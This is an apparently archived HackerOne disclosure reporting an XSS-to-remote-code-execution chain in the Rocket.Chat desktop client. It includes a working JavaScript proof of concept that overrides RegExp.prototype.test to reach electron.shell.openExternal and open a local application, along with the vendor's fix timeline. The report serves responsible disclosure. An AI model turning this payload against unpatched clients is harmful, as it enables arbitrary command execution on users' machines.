---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/os-command-injection
  - env/web
  - vuln/xss
  - vuln/command-injection
  - impact/rce
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
body: true
date: 2021-01-01
submitted: 2020-06-16T21:43:42.695Z
bounty_usd: null
votes: 31
cve: []
program: "[[programs/rocket_chat|Rocket.Chat]]"
reporter: "fabianfreyer"
source: "https://hackerone.com/reports/899964"
title: "XSS leads to RCE on the RocketChat desktop client."
---
# XSS leads to RCE on the RocketChat desktop client.

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 31 | **Program:** Rocket.Chat | **Disclosed:** 2021-01-01

- Report: [https://hackerone.com/reports/899964](https://hackerone.com/reports/899964)
- CWE: OS Command Injection
- Submitted: 2020-06-16T21:43:42.695Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:** It is possible to call `electron.shell.openExternal` from javascript inside a server webview.

**Description:** The document `onclick` handler allows executing `electron.shell.openExternal` by crafting an attacker-controlled link and dispatching a `click` event on it after overwriting `Regex.test`.

## Releases Affected:

  * Rocket.Chat Desktop Client up to version 2.17.9

## Steps To Reproduce (from initial installation to vulnerability):

  1. Have a XSS vulnerability such as #894462 or #899954.
  2. Call the following payload (for macos, adjust for other OSes as required):

```js
(function() {
    const payload = `file:///System/Applications/Calculator.app`;
    var counter = 0;
    var target = document.createElement(`a`);
    target.setAttribute(`href`, payload);
    document.body.appendChild(target);
    var old_test = RegExp.prototype.test;
    RegExp.prototype.test = function (s) {
        if (s === payload) {
            return (++counter > 3);
        }
        return old_test.call(this, s);
    };
    target.dispatchEvent(new Event(`click`));
})();
```

  3. Browse to a page with the XSS payload.
  4. Use your freshly opened calculator to calculate the result of 7*191.

## Impact

An attacker with a XSS vulnerability in RocketChat such as #894462 or #899954 can call `electron.shell.openExternal` with arbitrary URLs, leading to arbitrary command execution.

## Timeline

- **Report Filed**
- **Report Triaged**
- **Report Triaged**
- **2020-09-22** @markus-rocketchat: Hi Fabian

we have had a try at this, please see: https://github.com/RocketChat/Rocket.Chat.Electron/pull/1710
- **Report Resolved**
- **Agreed On Going Public**
- **2020-12-02** @fabianfreyer: I can verify that context isolation prevents prototype pollution from reaching into the checks for allowed protocol schemes.
- **Report Became Public**
